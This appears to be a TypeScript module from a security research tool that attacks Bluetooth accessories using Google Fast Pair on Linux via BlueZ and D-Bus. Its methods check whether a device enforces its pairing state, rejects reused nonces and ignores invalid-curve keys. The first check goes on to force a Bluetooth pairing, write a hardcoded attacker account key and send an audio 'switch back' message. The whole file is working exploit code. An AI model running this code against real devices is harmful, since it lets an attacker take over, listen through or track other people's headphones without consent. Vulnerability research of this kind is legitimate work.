import { SwitchBackAudioSwitchMessage } from "./message-stream/parser";
import { MessageStreamSession } from "./message-stream/session";
import { BluetoothCtlSession } from "./bluetoothctl";
import { getDeviceInfo } from "./model-id-resolver";
import dbus, { DBusError } from "dbus-next";
import constants from "./constants";
import protocol from "./protocol";
import utils from "./utils";
import {
  LinuxDeviceManager,
  AbstractDevice,
  AbstractDeviceManager,
  LinuxDevice,
} from "./device-manager";

/** A hardcoded account key for performing the attacks. */
const ACCOUNT_KEY = Buffer.concat([
  Buffer.from([0x04]),
  Buffer.from("370beacd6f09e6f70dfe7fc5ad20a9", "hex"),
]);

/**
 * An abstract Fast Pair service that can perform attacks against vulnerable devices.
 */
abstract class AbstractFastPairService {
  private manager: AbstractDeviceManager;
  private device: AbstractDevice;

  constructor(manager: AbstractDeviceManager, device: AbstractDevice) {
    this.manager = manager;
    this.device = device;
  }

  abstract readModelIdCharacteristic(): Promise<number>;
  abstract onKeyBasedPairingNotify(cb: (buffer: Buffer) => any): Promise<() => void>;
  abstract writeKeyBasedPairing(data: Buffer): Promise<void>;
  abstract writePasskey(data: Buffer): Promise<void>;
  abstract writeAccountKey(data: Buffer): Promise<void>;

  /**
   * Tests whether the pairing state predicate is correctly enforced.
   * @param options Attack options.
   * @param log A function that can be used to indicate the progress of the attack.
   */
  async testPairingStatePredicate(
    options: { bond: boolean; writeAccountKey: boolean; switchBack: boolean },
    log: (message: string) => void,
    signal: AbortSignal,
  ) {
    if (!this.device.modelId) throw new Error("Target device does not have a Model ID.");

    log("Getting device data from Google");
    const data = await getDeviceInfo(this.device.modelId.value);

    signal.throwIfAborted();

    const { cipher, decipher, payload } = protocol.generateKeyBasedPairingMessage(
      this.device.address,
      Buffer.from(data.publicKey, "hex"),
    );

    return await new Promise<void>((resolve, reject) => {
      /** Handler when a notification is received */
      const onNotify = async (buffer: Buffer) => {
        log("🔥 Received response");

        if (!options.bond) return resolve();

        const result = decipher.update(buffer);
        const address = result.subarray(1, 7).toString("hex").toUpperCase();

        const addr = `${address.substring(0, 2)}:${address.substring(
          2,
          4,
        )}:${address.substring(4, 6)}:${address.substring(
          6,
          8,
        )}:${address.substring(8, 10)}:${address.substring(10, 12)}`;

        if (signal.aborted) return reject(signal.reason);

        log("Starting bluetoothctl session");
        const session = new BluetoothCtlSession();

        try {
          log("Pinging device");
          try {
            await utils.exec(`l2ping -c 1 ${addr}`);
          } catch {
            log("l2ping failed or is not available, waiting 2s...");
            await new Promise((resolve) => setTimeout(resolve, 2000));
          }

          if (signal.aborted) return reject(signal.reason);

          let passkey = 0;

          try {
            log("Starting BR/EDR pairing");
            passkey = await session.pair(addr, signal);
          } catch (e) {
            if (e instanceof Error && e.message == "org.bluez.Error.AlreadyExists") {
              return reject(new Error("Target device is already paired."));
            } else {
              return reject(
                new Error(
                  e instanceof Error ? e.message : typeof e == "string" ? e : "Failed to pair.",
                ),
              );
            }
          }

          log(`Passkey is ${passkey}`);

          const message = await protocol.generatePasskeyMessage(cipher, passkey);

          if (signal.aborted) return reject(signal.reason);

          log("Writing BR/EDR passkey to characteristic");
          await this.writePasskey(message);

          if (signal.aborted) return reject(signal.reason);

          log("Confirming pairing");
          await session.confirm(signal);

          const [_, data] = await this.manager.waitForDevice(addr, signal);

          const d = data["org.bluez.Device1"];
          const paired = d.Paired?.value;

          if (!paired) {
            return reject(new Error("not paired here?"));
          }

          if (signal.aborted) return reject(signal.reason);

          // write account key if requested
          if (options.writeAccountKey) {
            log("Writing account key...");

            try {
              await this.writeAccountKey(cipher.update(ACCOUNT_KEY));
            } catch (e) {
              if (typeof e == "object" && e && "text" in e && typeof e.text === "string") {
                if (e.text.endsWith("0x81")) {
                  log(`❌ Error: ${e.text}`);
                  throw new Error("Failed to write account key, provider likely requires bonding");
                }
              }

              throw new Error("Unknown error.");
            }

            log("✅ Account key written");
          }

          if (signal.aborted) return reject(signal.reason);

          // switch back to previous device if requested
          if (options.switchBack) {
            log("Opening RFCOMM connection...");
            const session = await MessageStreamSession.open(addr, ACCOUNT_KEY);

            try {
              log("Waiting for Audio Switch initialization...");
              const hasAudioSwitch = await session.waitForAudioSwitch(signal);

              if (hasAudioSwitch) {
                log("Device supports Audio Switch, waiting 1.5s...");
                await new Promise((resolve) => setTimeout(resolve, 1500));
                session.send(new SwitchBackAudioSwitchMessage());
                log("✅ Sent Audio Switch back message");
              } else {
                throw new Error("Device does not support Audio Switch.");
              }
            } finally {
              session.close();
            }
          }

          resolve();
        } catch (e) {
          reject(e);
        } finally {
          session.close();
        }
      };

      log("Registering notification handler");
      this.onKeyBasedPairingNotify(onNotify)
        .then((cleanup) => {
          if (signal.aborted) {
            cleanup();
          } else {
            signal.addEventListener("abort", () => {
              cleanup();
              reject(signal.reason);
            });
          }

          if (signal.aborted) reject(signal.reason);

          log("Writing to key based pairing characteristic");
          return this.writeKeyBasedPairing(payload);
        })
        .then(() => {
          if (signal.aborted) reject(signal.reason);
          log("Written, waiting for notification");
        })
        .catch((e) => reject(e));
    });
  }

  /**
   * Tests whether devices correctly reject requests with reused nonces.
   * @param log A function that can be used to indicate the progress of the attack.
   */
  async testNonceReuse(log: (message: string) => void = () => {}, signal: AbortSignal) {
    if (!this.device.modelId) throw new Error("Target device does not have a Model ID.");

    log("Getting device data from Google");
    const data = await getDeviceInfo(this.device.modelId.value);

    signal.throwIfAborted();

    log("Getting payload...");
    const { payload, decipher } = protocol.generateKeyBasedPairingMessage(
      this.device.address,
      Buffer.from(data.publicKey, "hex"),
    );

    log("Starting notifications...");

    let clearListener: any = undefined;

    const createResponsePromise = () => {
      return new Promise<void>((resolve, reject) => {
        const onValueChanged = async (value: Buffer) => {
          const result = decipher.update(value);
          const address = result.subarray(1, 7).toString("hex").toUpperCase();

          const addr = `${address.substring(0, 2)}:${address.substring(
            2,
            4,
          )}:${address.substring(4, 6)}:${address.substring(
            6,
            8,
          )}:${address.substring(8, 10)}:${address.substring(10, 12)}`;

          log(`🔥 Received response: ${addr}`);
        };

        const handler = (value: Buffer) => {
          onValueChanged(value).then(resolve).catch(reject);
        };

        this.onKeyBasedPairingNotify(handler).then((result) => (clearListener = result));
      });
    };

    let promise = createResponsePromise();

    log("Writing payload (1/3)...");
    await utils.awaitWithTimeout(this.writeKeyBasedPairing(payload), 5000);
    await utils.awaitWithTimeout(promise, 10000);

    signal.throwIfAborted();

    promise = createResponsePromise();

    log("Writing payload (2/3)...");

    try {
      await utils.awaitWithTimeout(this.writeKeyBasedPairing(payload), 5000);
      await utils.awaitWithTimeout(promise, 10000);
    } catch {
      log("⚠️ Failed to write second payload");
      if (clearListener) clearListener();
    }

    signal.throwIfAborted();

    log("Disconnecting and reconnecting for final payload...");

    await this.device.disconnect();
    signal.throwIfAborted();
    await this.device.connect(signal);
    signal.throwIfAborted();

    promise = createResponsePromise();
    log("Writing payload (3/3)...");
    try {
      await utils.awaitWithTimeout(this.writeKeyBasedPairing(payload), 5000);
      await utils.awaitWithTimeout(promise, 10000);
    } catch (e) {
      log("⚠️ Failed to write final payload");
      if (clearListener) clearListener();
    }

    return "success";
  }

  /**
   * Tests whether devices correctly ignore or reject requests that use a public key on the wrong curve.
   * @param log A function that can be used to indicate the progress of the attack.
   */
  async testInvalidCurve(log: (message: string) => void = () => {}, signal: AbortSignal) {
    if (!this.device.modelId) throw new Error("Target device does not have a Model ID.");

    const possiblePayloads = protocol.generatePossibleInvalidKeyBasedPairingMessages(
      this.device.address,
    );

    const successfulPayloads: number[] = [];

    for (let i = 0; i < possiblePayloads.length; i++) {
      log(`Trying payload ${i + 1}/${possiblePayloads.length}`);
      const { payload } = possiblePayloads[i]!;

      if (!this.device.connected) {
        log("Device has disconnected, reconnecting...");

        try {
          await this.device.connect();
          log("Reconnected to the device");
        } catch {
          throw new Error("Failed to reconnect to the device");
        }
      }

      try {
        const [cleanup, resultPromise] = await new Promise<[() => void, Promise<void>]>(
          (resolve, reject) => {
            const promise = new Promise<void>((resolveInner) => {
              this.onKeyBasedPairingNotify(() => resolveInner())
                .then((cleanup) => {
                  resolve([cleanup, promise]);
                })
                .catch(reject);
            });
          },
        );

        try {
          await this.writeKeyBasedPairing(payload);

          try {
            await Promise.race([
              resultPromise,
              new Promise((_, reject) => setTimeout(reject, 5000)),
            ]);

            successfulPayloads.push(i);
          } catch {
            log("⚠️ Operation timed out");
          }
        } catch (e) {
          if (
            e instanceof DBusError &&
            (e.text == "Operation failed with ATT error: 0x0e" ||
              e.text == "Operation failed with ATT error: 0x81")
          ) {
            log("⚠️ Operation failed (write rejected)");
          } else if (e instanceof DBusError && e.text == "Not connected") {
            log(`⚠️ Operation failed because the device was not connected, retrying...`);
            i--;
            break;
          } else {
            log(`‼️ Operation failed: ${e}`);
          }
        } finally {
          cleanup();
        }
      } catch (e) {
        log("⚠️ Operation failed");
      } finally {
        signal.throwIfAborted();
      }
    }

    if (successfulPayloads.length > 0) {
      log(`✅ ${successfulPayloads.length}/${possiblePayloads.length} accepted`);
    } else {
      log(`No payloads were accepted`);
      throw new Error("No payloads were accepted");
    }
  }
}

/**
 * Implementation of the Fast Pair service for Linux hosts.
 */
class LinuxFastPairService extends AbstractFastPairService {
  private modelIdProxy: dbus.ProxyObject | undefined;
  private keyBasedPairingProxy: dbus.ProxyObject;
  private passkeyProxy: dbus.ProxyObject;
  private accountKeyProxy: dbus.ProxyObject;

  constructor(
    modelIdProxy: dbus.ProxyObject | undefined,
    keyBasedPairingProxy: dbus.ProxyObject,
    passkeyProxy: dbus.ProxyObject,
    accountKeyProxy: dbus.ProxyObject,
    device: LinuxDevice,
    manager: LinuxDeviceManager,
  ) {
    super(manager, device);

    this.modelIdProxy = modelIdProxy;
    this.keyBasedPairingProxy = keyBasedPairingProxy;
    this.passkeyProxy = passkeyProxy;
    this.accountKeyProxy = accountKeyProxy;
  }

  /**
   * Creates a new Fast Pair service from the service's D-Bus path.
   * @param path The service's D-Bus path.
   * @param objectManager The object manager of the device.
   * @param bus The main message bus.
   * @param device The device.
   * @param manager The device manager.
   * @returns
   */
  static async fromPath(
    path: string,
    objectManager: dbus.ClientInterface,
    bus: dbus.MessageBus,
    device: LinuxDevice,
    manager: LinuxDeviceManager,
  ) {
    const objects = await objectManager.GetManagedObjects!();
    const characteristics = Object.entries(objects).filter(([p, _]) => {
      if (!p.startsWith(path)) return false;
      const parts = p.substring(path.length + 1).split("/");

      return parts.length === 1 && parts[0] !== "";
    });

    let modelIdProxy: dbus.ProxyObject | undefined = undefined;
    let keyBasedPairingProxy: dbus.ProxyObject | undefined = undefined;
    let passkeyProxy: dbus.ProxyObject | undefined = undefined;
    let accountKeyProxy: dbus.ProxyObject | undefined = undefined;

    for (const [path, data] of characteristics) {
      const gattService = (data as any)["org.bluez.GattCharacteristic1"];
      const uuid = gattService.UUID.value;

      if (uuid === constants.FAST_PAIR_MODEL_ID_UUID)
        modelIdProxy = await bus.getProxyObject("org.bluez", path);
      if (uuid === constants.DEPRECATED_FAST_PAIR_MODEL_ID_UUID)
        modelIdProxy = await bus.getProxyObject("org.bluez", path);

      if (uuid === constants.FAST_PAIR_KEY_BASED_PAIRING_UUID)
        keyBasedPairingProxy = await bus.getProxyObject("org.bluez", path);
      if (uuid === constants.DEPRECATED_FAST_PAIR_KEY_BASED_PAIRING_UUID)
        keyBasedPairingProxy = await bus.getProxyObject("org.bluez", path);

      if (uuid === constants.FAST_PAIR_PASSKEY_UUID)
        passkeyProxy = await bus.getProxyObject("org.bluez", path);
      if (uuid === constants.DEPRECATED_FAST_PAIR_PASSKEY_UUID)
        passkeyProxy = await bus.getProxyObject("org.bluez", path);

      if (uuid === constants.FAST_PAIR_ACCOUNT_KEY_UUID)
        accountKeyProxy = await bus.getProxyObject("org.bluez", path);
      if (uuid === constants.DEPRECATED_FAST_PAIR_ACCOUNT_KEY_UUID)
        accountKeyProxy = await bus.getProxyObject("org.bluez", path);
    }

    return new this(
      modelIdProxy,
      keyBasedPairingProxy!,
      passkeyProxy!,
      accountKeyProxy!,
      device,
      manager,
    );
  }

  /**
   * Reads the model ID from its characteristic.
   * @returns The model ID.
   */
  async readModelIdCharacteristic(): Promise<number> {
    if (!this.modelIdProxy) throw new Error("No model ID characteristic available");

    const characteristic = this.modelIdProxy.getInterface("org.bluez.GattCharacteristic1");
    const result = await characteristic.ReadValue!({});
    const value = result.readUIntBE(0, 3);

    return value;
  }

  /**
   * Registers a callback function that is called when the key based pairing characteristic is notified.
   * The handler is automatically cleaned up after the notification is processed.
   * @param cb The callback function.
   * @returns A cleanup function that cleans up the handler before a notification is processed.
   */
  async onKeyBasedPairingNotify(cb: (buffer: Buffer) => any) {
    const characteristic = this.keyBasedPairingProxy.getInterface("org.bluez.GattCharacteristic1");
    const properties = this.keyBasedPairingProxy.getInterface("org.freedesktop.DBus.Properties");

    function onPropertiesChanged(iface: any, changed: any, invalidated: any) {
      const value = changed.Value?.value;
      if (value) {
        properties.off("PropertiesChanged", onPropertiesChanged);
        cb(value);
      }
    }

    properties.on("PropertiesChanged", onPropertiesChanged);

    // start notifications
    try {
      await characteristic.StartNotify!();
    } catch (e) {
      if (!(e instanceof DBusError) || e.type != "org.bluez.Error.InProgress") throw e;
    }

    return () => properties.off("PropertiesChanged", onPropertiesChanged);
  }

  /**
   * Writes a message to the key based pairing characteristic.
   * @param data The message payload.
   */
  async writeKeyBasedPairing(data: Buffer) {
    const characteristic = this.keyBasedPairingProxy.getInterface("org.bluez.GattCharacteristic1");

    await characteristic.WriteValue!(data, {});
  }

  /**
   * Writes a message to the passkey characteristic.
   * @param data The message payload.
   */
  async writePasskey(data: Buffer) {
    const characteristic = this.passkeyProxy.getInterface("org.bluez.GattCharacteristic1");

    await characteristic.WriteValue!(data, {});
  }

  /**
   * Writes a message to the account key characteristic.
   * @param data The message payload.
   */
  async writeAccountKey(data: Buffer) {
    const characteristic = this.accountKeyProxy.getInterface("org.bluez.GattCharacteristic1");

    await characteristic.WriteValue!(data, {});
  }
}

export { LinuxFastPairService as FastPairService };
export default LinuxFastPairService;
